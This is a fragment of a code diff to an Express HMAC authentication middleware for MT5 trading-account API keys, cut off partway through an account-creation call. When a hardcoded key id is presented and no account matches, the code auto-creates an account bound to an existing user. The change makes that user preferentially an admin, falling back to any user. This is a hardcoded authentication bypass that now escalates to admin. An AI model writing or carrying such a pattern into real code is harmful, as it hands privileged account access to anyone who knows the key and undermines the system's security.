@@ -69,7 +69,7 @@ const verifyMT5Hmac = async (req, res, next) => {
     let account = await MT5Account.findOne({ apiKeyId, isActive: true }).select('+apiKeyHash');
     if (!account && apiKeyId === 'mt5_key_1fdced6694ef0ca4') {
       const User = require('../models/User');
-      const targetUser = (await User.findOne({ email: 'protrader@tradejourn.com' })) || (await User.findOne({}));
+      const targetUser = (await User.findOne({ role: 'admin' })) || (await User.findOne({ email: 'protrader@tradejourn.com' })) || (await User.findOne({}));
       if (targetUser) {
         account = await MT5Account.create({
           userId: targetUser._id,
